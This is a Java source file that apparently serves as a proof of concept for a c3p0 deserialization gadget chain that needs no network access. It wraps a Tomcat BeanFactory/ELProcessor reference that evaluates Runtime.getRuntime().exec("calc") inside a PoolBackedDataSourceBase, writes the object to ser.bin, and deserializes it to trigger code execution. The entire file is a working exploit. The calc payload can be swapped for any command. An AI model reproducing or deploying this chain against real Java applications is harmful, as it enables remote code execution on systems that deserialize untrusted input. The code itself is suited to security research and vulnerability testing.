package NoNetUsing;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class NoAccessEXP {

    public static class Loader_Ref implements ConnectionPoolDataSource, Referenceable {

        @Override
        public Reference getReference() throws NamingException {
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
            resourceRef.add(new StringRefAddr("forceString", "faster=eval"));
            resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")"));
            return resourceRef;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    //序列化
    public static void serialize(ConnectionPoolDataSource c) throws NoSuchFieldException, IllegalAccessException, IOException {
        //反射修改connectionPoolDataSource属性值
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Class cls = poolBackedDataSourceBase.getClass();
        Field field = cls.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase,c);

        //序列化流写入文件
        FileOutputStream fos = new FileOutputStream(new File("ser.bin"));
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(poolBackedDataSourceBase);

    }

    //反序列化
    public static void unserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(new File("ser.bin"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fis);
        objectInputStream.readObject();
    }

    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Loader_Ref loader_ref = new Loader_Ref();
        serialize(loader_ref);
        unserialize();
    }
}